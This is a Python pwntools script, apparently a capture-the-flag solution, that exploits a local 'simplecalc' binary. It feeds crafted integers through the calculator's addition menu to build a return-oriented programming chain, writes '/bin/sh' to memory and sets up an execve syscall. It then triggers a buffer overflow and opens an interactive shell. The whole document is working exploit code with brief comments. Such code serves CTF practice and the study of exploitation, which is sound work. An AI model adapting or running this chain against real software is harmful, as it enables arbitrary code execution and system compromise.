from pwn import *

target = process('./simplecalc')

target.recvuntil('calculations: ')
target.sendline('100')

popRax = 0x44db34
popRdi = 0x401b73
popRsi = 0x401c87
popRdx = 0x437a85

movGadget = 0x44526e

syscall = 0x400488

# since the result would be written, we just simulate an addition
def add_single(x):
  target.recvuntil("=> ")
  target.sendline("1")
  target.recvuntil("Integer x: ")
  target.sendline("100")
  target.recvuntil("Integer y: ")
  target.sendline(str(x - 100))

def add(z):
  x = z & 0xffffffff
  y = ((z & 0xffffffff00000000) >> 32)
  add_single(x)
  add_single(y)

for i in range(9):
  # Fill it up with null bytes, to make the ptr passed to free be a null pointer
  # So free doesn't crash
  add(0x0)

add(popRax)
add(0x6c1000) # the write-free zone
add(popRdx)
add(0x0068732f6e69622f) # "/bin/sh" in hex
add(movGadget)

add(popRax)
add(0x3b)

add(popRdi) # Specify pointer to "/bin/sh"
add(0x6c1000)

add(popRsi)
add(0x0)
add(popRdx)
add(0x0)

add(syscall)

target.sendline('5') # Save and exit to execute memcpy and trigger buffer overflow

target.interactive()